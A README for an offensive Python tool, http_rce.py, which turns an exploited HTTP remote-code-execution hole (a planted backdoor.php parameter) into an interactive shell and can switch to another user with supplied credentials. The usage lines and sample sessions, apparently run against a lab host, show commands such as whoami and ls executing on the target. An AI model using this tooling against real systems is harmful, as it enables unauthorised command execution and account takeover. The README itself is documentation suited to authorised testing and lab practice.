# Http Remote Shell

## Introduction

This tool gives a basic command line interface of an exploited HTTP RCE.

This might be useful if no bind-shell, nor reverse-shell can be setup.

NB: The tool spawns a TTY shell with `/usr/bin/script` to correct the error: `su: must be run from terminal` (https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal)

## Usage

```bash
$ python3 ./http_rce.py -h
$ python3 ./http_rce.py --url '<URL>' --http-method GET
$ python3 ./http_rce.py --url '<URL>' --http-method GET --user '<USER>' --pass '<PASS>'
$ python3 ./http_rce.py --url '<URL>' --http-method GET --user '<USER>' --pass '<PASS>' --regex-pattern 'Password: (.*), plz dont share it'
```

The command's placeholder in the URL MUST be `MY_CMD`.

## Examples

Running as default user (e.g. `www-data`):
```bash
$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?c=MY_CMD' --http-method GET
bash > whoami
www-data

bash > ls
assets
css
index.php
js

bash >
```

Running as another user (e.g. `foo`):
```bash
$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?cmd=MY_CMD&foo1=bar2' --http-method GET --user 'foo' --pass 'bar123'
bash > whoami
foo

bash > ls
assets css index.php js

bash >
```

Using the `--regex-pattern` option will only show the matched string (between parenthesis in the pattern) from the web server's response
